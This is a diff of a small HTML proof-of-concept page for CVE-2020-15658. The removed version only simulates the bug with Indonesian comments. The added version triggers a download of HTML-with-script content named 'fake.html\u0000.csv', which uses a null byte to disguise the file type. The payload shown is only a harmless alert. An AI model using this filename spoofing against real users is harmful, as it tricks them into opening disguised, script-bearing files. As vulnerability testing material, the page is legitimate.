@@ -1,32 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>PoC: Download File Spoof</title>
-</head>
-<body>
-  <h2>Simulasi Download File Spoof (CVE-2020-15658)</h2>
-
-  <p>Tekan tombol di bawah untuk mengunduh file dengan nama terlihat seperti CSV, tetapi isinya HTML.</p>
-
-  <button onclick="downloadSpoofed()">Download File</button>
-
-  <script>
-    function downloadSpoofed() {
-      // Simulasi isi file HTML
-      const htmlContent = `<html><body><h1>INI FILE HTML</h1><script>alert('CVE‑2020‑15658')</script></body></html>`;
-      const blob = new Blob([htmlContent], { type: "text/html" });
-
-      const a = document.createElement("a");
-      a.href = URL.createObjectURL(blob);
-
-      // Tidak bisa pakai \u0000 di browser modern, jadi kita simulasi saja
-      // Versi bug: a.download = "evil.html\u0000.csv";
-      a.download = "report.csv"; // Terlihat seperti CSV, tapi isinya HTML
-
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-    }
-  </script>
-</body>
+  <body>
+    <h1>Test CVE‑2020‑15658</h1>
+    <button onclick="trigger()">Download Fake CSV</button>
+    <script>
+      function trigger() {
+        const blob = new Blob(
+          ["<html><body><script>alert('hello')</script></body></html>"],
+          { type: "text/html" }
+        );
+        const a = document.createElement("a");
+        a.href = URL.createObjectURL(blob);
+        a.download = "fake.html\u0000.csv";
+        a.dispatchEvent(new MouseEvent("click"));
+      }
+    </script>
+  </body>
 </html>
